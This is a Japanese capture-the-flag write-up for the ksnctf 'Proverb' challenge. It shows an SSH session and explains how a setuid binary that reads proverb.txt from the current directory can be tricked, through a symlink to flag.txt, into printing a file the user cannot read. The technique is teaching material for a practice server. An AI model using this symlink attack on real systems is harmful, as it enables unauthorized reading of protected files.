# ksnctf: Proverb

**Category:** Misc  
**Points:** 70pt  
**Description:**  

> SSH: ctfq.sweetduet.info:10022  
> ID: q13  
> Pass: 8zvWx00MakSCQuGq

**Hint:**

>

## 解き方
問題のタイトルは「諺」．とりあえずsshで接続する．

```
$ ssh q13@ctfq.sweetduet.info -p 10022
q13@ctfq.sweetduet.info's password: 
Last login: Wed Dec  5 16:05:53 2018 from 10.0.2.2
[q13@localhost ~]$ ls -al
total 48
drwxr-xr-x   2 root root  4096 Jun  1  2012 .
drwxr-xr-x. 17 root root  4096 Oct  6  2014 ..
-rw-r--r--   1 root root    18 May 11  2012 .bash_logout
-rw-r--r--   1 root root   176 May 11  2012 .bash_profile
-rw-r--r--   1 root root   124 May 11  2012 .bashrc
-r--------  11 q13a q13a    22 Jun  1  2012 flag.txt
---s--x--x  12 q13a q13a 14439 Jun  1  2012 proverb
-r--r--r--   2 root root   755 Jun  1  2012 proverb.txt
-r--r--r--   1 root root   151 Jun  1  2012 readme.txt

[q13@localhost ~]$ file *
flag.txt:    regular file, no read permission
proverb:     setuid executable, regular file, no read permission
proverb.txt: ASCII English text
readme.txt:  ASCII English text

[q13@localhost ~]$ cat readme.txt 
You are not allowed to connect internet and write the home directory.
If you need temporary directory, use /tmp.
Sometimes this machine will be reset.

[q13@localhost ~]$ cat proverb.txt 
All's well that ends well.
A good beginning makes a good ending.
Many a true word is spoken in jest.
Fear is often greater than the danger.
- 省略 -

[q13@localhost ~]$ ./proverb 
The die is cast.
[q13@localhost ~]$ ./proverb 
All's well that ends well.

[q13@localhost ~]$ cat flag.txt
cat: flag.txt: Permission denied
```

`proverb.txt`は諺のテーマパークで，`proberv`は`txt`を読み込んで端末上に諺を出力する，実行可能なファイルとわかった，当然`flag`は読み込み権限なし．`proberv`に引数として与えてみたが反応なし．

`/home/q13/proverb`を使って`/home/q13/flag.txt`を読み込みたい．

`readme`には作業ディレクトリが必要なら`/tmp`を使ってくれとのことだったので，`cp`か`ln`を試みるも既にファイルはあるよと言われた．

```
[q13@localhost ~]$ cp proverb /tmp/proverb
cp: `proverb' and `/tmp/proverb' are the same file
[q13@localhost ~]$ cd /tmp && cat proverb.txt
Please make your own subdirectory.
```

仕方なく指示通りサブディレクトリを作ろうとしたところ，

```
[q13@localhost tmp]$ mkdir test
mkdir: cannot create directory `test': File exists
[q13@localhost tmp]$ cat test
cat: test: Is a directory
[q13@localhost tmp]$ cd test
[q13@localhost test]$ ls -al
total 8
drwxrwxr-x   2 q13  q13  4096 Nov 26 19:43 .
drwxrwx-wt. 19 root root 4096 Dec  5 16:47 ..
lrwxrwxrwx   1 q13  q13    17 Nov 26 19:42 proverb -> /home/q13/proverb
lrwxrwxrwx   1 q13  q13    18 Nov 26 19:43 proverb.txt -> /home/q13/flag.txt
[q13@localhost test]$ ./proverb 
- 省略 -
```

名前を言ってはいけないディレクトリを引き当てたらしく，test環境と思しきディレクトリでflagを取得できてしまった．うーん，こういうのはちゃんと消してくれ...

おそらく正攻法は作ったサブディレクトリ上で`ln -s ~/flag.txt /tmp/hoge/proverb.txt`などとして`/home/q13/proverb`を実行するといった感じだろうか．

釈然としないので，この問題の背景は何かGoogle先生に聞いてみた．IPAに丁寧な解説があった．

[シンボリックリンクの悪用](https://www.ipa.go.jp/security/awareness/vendor/programmingv1/b07_01.html)

ちなみに，sshでアクセスしたユーザはq13である．今，`flag.txt`はq13aに所属しており，ファイルへの読み取りアクセス権はq13aとrootにある．しかし，`proverb`には`suid set`が付与されているので，任意のユーザがq13aと同じ特権でプログラムを実行できる．
q13にはproberbのコードを読む権限はないが，実行すると，現在のディレクトリにある `proverb.txt`の有無を確認して，ランダムに1行を選択しstdoutで端末に出力する．

`proverb.txt`の有無を確認する際，`proverb`は`proverb.txt`というファイル名だけを確認し，実体のあるファイルなのかシンボリックリンクなのかは気にしていないように思える．

故に，`/home/q13/flag.txt`を示す`proverb.txt`というシンボリックリンクを作成して，`proverb`を実行すると，`/home/q13/flag.txt`へリダイレクトされる．
`proverb`はq13aの権限として実行されているため，flag情報を読み取り，その結果を端末へ表示するものと推測できる．